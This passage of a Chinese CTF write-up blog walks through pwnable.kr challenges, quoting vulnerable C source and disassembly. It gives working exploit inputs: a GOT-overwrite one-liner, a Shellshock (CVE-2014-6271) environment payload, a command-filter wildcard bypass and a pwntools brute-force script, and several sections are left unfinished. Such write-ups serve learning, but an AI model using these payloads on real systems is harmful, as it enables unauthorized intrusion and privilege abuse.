scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } 容易注意到login函数中这句 scanf(\"%d\", passcode1); 本应该为 scanf(\"%d\", \u0026passcode1); 也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 用IDA反编译一下 int login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\", v1); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\", v2); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) { puts(\"Login Failed!\"); exit(0); } puts(\"Login OK!\"); return system(\"/bin/cat flag\"); } unsigned int welcome() { char v1[100]; // [esp+18h] [ebp-70h] BYREF unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(\"enter you name : \"); __isoc99_scanf(\"%100s\", v1); printf(\"Welcome %s!\\n\", v1); return __readgsdword(0x14u) ^ v2; } 由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system(\"/bin/cat flag\")这个指令了. 在IDA里找到他们: .plt:08048420 .plt:08048420 ; =============== S U B R O U T I N E ======================================= .plt:08048420 .plt:08048420 ; Attributes: thunk .plt:08048420 .plt:08048420 ; int printf(const char *format, ...) .plt:08048420 _printf proc near ; CODE XREF: login+E↓p .plt:08048420 ; login+3C↓p ... .plt:08048420 .plt:08048420 format = dword ptr 4 .plt:08048420 .plt:08048420 jmp ds:off_804A000 .plt:08048420 _printf endp .plt:08048420 .text:08048562 ; --------------------------------------------------------------------------- .text:08048563 align 4 .text:08048564 .text:08048564 ; =============== S U B R O U T I N E ======================================= .text:08048564 .text:08048564 ; Attributes: bp-based frame .text:08048564 .text:08048564 public login .text:08048564 login proc near ; CODE XREF: main+1A↓p .text:08048564 .text:08048564 var_10 = dword ptr -10h .text:08048564 var_C = dword ptr -0Ch .text:08048564 .text:08048564 ; __unwind { .text:08048564 push ebp .text:08048565 mov ebp, esp .text:08048567 sub esp, 28h .text:0804856A mov eax, offset format ; \"enter passcode1 : \" .text:0804856F mov [esp], eax ; format .text:08048572 call _printf .text:08048577 mov eax, offset aD ; \"%d\" .text:0804857C mov edx, [ebp+var_10] .text:0804857F mov [esp+4], edx .text:08048583 mov [esp], eax .text:08048586 call ___isoc99_scanf .text:0804858B mov eax, ds:stdin@@GLIBC_2_0 .text:08048590 mov [esp], eax ; stream .text:08048593 call _fflush .text:08048598 mov eax, offset aEnterPasscode2 ; \"enter passcode2 : \" .text:0804859D mov [esp], eax ; format .text:080485A0 call _printf .text:080485A5 mov eax, offset aD ; \"%d\" .text:080485AA mov edx, [ebp+var_C] .text:080485AD mov [esp+4], edx .text:080485B1 mov [esp], eax .text:080485B4 call ___isoc99_scanf .text:080485B9 mov dword ptr [esp], offset s ; \"checking...\" .text:080485C0 call _puts .text:080485C5 cmp [ebp+var_10], 528E6h .text:080485CC jnz short loc_80485F1 .text:080485CE cmp [ebp+var_C], 0CC07C9h .text:080485D5 jnz short loc_80485F1 .text:080485D7 mov dword ptr [esp], offset a","date":"2022-10-12","objectID":"/pwnable.kr/:3:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r实现: python -c 'print \"A\"*96+\"\\x00\\xa0\\x04\\x08\"+\"134514147\\n\"' | ./passcode ","date":"2022-10-12","objectID":"/pwnable.kr/:3:1","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r6 random #include \u003cstdio.h\u003e int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } 注意到rand()没有用srand()设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key. 算出key = -1255736440, 运行random程序输入key得到flag random@pwnable:~$ ./random -1255736440 Good! Mommy, I thought libc random is unpredictable... ","date":"2022-10-12","objectID":"/pwnable.kr/:4:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r7 input","date":"2022-10-12","objectID":"/pwnable.kr/:5:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r8 leg","date":"2022-10-12","objectID":"/pwnable.kr/:6:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r9 mistake We all make mistakes, let's move on. (don't take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) 提示是操作符的优先级 #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } 观察这一行 if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ 乍一看没什么不对, 当返回的文件描述符小于0时报错 但是\u003c是比=优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3\u003c0这个表达式, 它的值是0. 最后执行fd=0, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的. 然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符. 所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0’的ascii码为110000, 字符'1’的ascii码为110001, 恰好'0’^1 = ‘1’. 所以只需进行如下操作 ./mistake do not bruteforce... 0000000000 1111111111input password : Password OK Mommy, the operator priority always confuses me :( ","date":"2022-10-12","objectID":"/pwnable.kr/:7:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r10 shellshock这是一个set-uid程序: #include \u003cstdio.h\u003e int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c 'echo shock_me'\"); return 0; } 这是一个别名为shellshock的漏洞, CVE-2014-6271 原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发 export foo='{:;}; echo test' bash test 测试方法: shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" this is a test shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c \"echo this is a test\" vulnerable 证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞 攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中 setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); 确保了这一点. 所以可以这样攻击: shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock only if I knew CVE-2014-6271 ten years ago..!! Segmentation fault shellshock@ubuntu:~$ ","date":"2022-10-12","objectID":"/pwnable.kr/:8:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r11 coin1","date":"2022-10-12","objectID":"/pwnable.kr/:9:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r12 blackjack","date":"2022-10-12","objectID":"/pwnable.kr/:10:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r13 lottolotto.c: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e unsigned char submit[6]; void play(){ int i; printf(\"Submit your 6 lotto bytes : \"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i\u003c6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); } } void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\"); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", \u0026menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0; } 看这段: for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } 原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如’#’, 一直输入 “######”, 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag. 不会写代码识别flag, 所以我只能人工盯着屏幕看了 from pwn import * s = ssh(host='pwnable.kr',user='lotto', port=2222, password='guest') p = s.process('./lotto') while 1: p.sendline(\"1\") p.sendline(\"######\") print(p.recvline()) # s.interactive() 可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了 [+] Starting remote process bytearray(b'./lotto') on pwnable.kr: pid 281220 /home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"1\") /home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"######\") b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' // 第一次出现flag在这 b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lott","date":"2022-10-12","objectID":"/pwnable.kr/:11:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r14 cmd1 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } 代码很短, 主要就是执行system(argv[1])但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来. 没有环境变量, 就直接用绝对路径\"/bin/cat\" 不能直接出现flag, 但可以用*通配符啊 所以 ./cmd \"/bin/cat fl*\" ","date":"2022-10-12","objectID":"/pwnable.kr/:12:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r15 cmd2没做呢 ","date":"2022-10-12","objectID":"/pwnable.kr/:13:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r16 uafuse after free漏洞 源码: #include \u003ccstdlib\u003e #include \u003ccstring\u003e #include \u003cfcntl.h\u003e #include \u003ciostream\u003e #include \u003cunistd.h\u003e using namespace std; class Human { private: virtual void give_shell() { system(\"/bin/sh\"); } protected: int age; string name; public: virtual void introduce() { cout \u003c\u003c \"My name is \" \u003c\u003c name \u003c\u003c endl; cout \u003c\u003c \"I am \" \u003c\u003c age \u003c\u003c \" years old\" \u003c\u003c endl; } }; class Man : public Human { public: Man(string name, int age) { this-\u003ename = name; this-\u003eage = age; } virtual void introduce() { Human::introduce(); cout \u003c\u003c \"I am a nice guy!\" \u003c\u003c endl; } }; class Woman : public Human { public: Woman(string name, int age) { this-\u003ename = name; this-\u003eage = age; } virtual void introduce() { Human::introduce(); cout \u003c\u003c \"I am a cute girl!\" \u003c\u003c endl; } }; int main(int argc, char *argv[]) { Human *m = new Man(\"Jack\", 25); Human *w = new Woman(\"Jill\", 21); size_t len; char *data; unsigned int op; while (1) { cout \u003c\u003c \"1. use\\n2. after\\n3. free\\n\"; cin \u003e\u003e op; switch (op) { case 1: m-\u003eintroduce(); w-\u003eintroduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u003c\u003c \"your data is allocated\" \u003c\u003c endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } ","date":"2022-10-12","objectID":"/pwnable.kr/:14:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\runexploitable int __cdecl main(int argc, const char **argv, const char **envp) { char buf[16]; // [rsp+0h] [rbp-10h] BYREF sleep(3u); return read(0, buf, 0x50FuLL); } GOT表里什么都没有, 乍一看好像寄了, 但神奇的地方在于这个read的参数0x50F, 他在内存里是个0x0F05,所以用ROPgadget能找到一个syscall. 0.虚表 1 2 3 ","date":"2022-10-12","objectID":"/pwnable.kr/:14:1","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"}]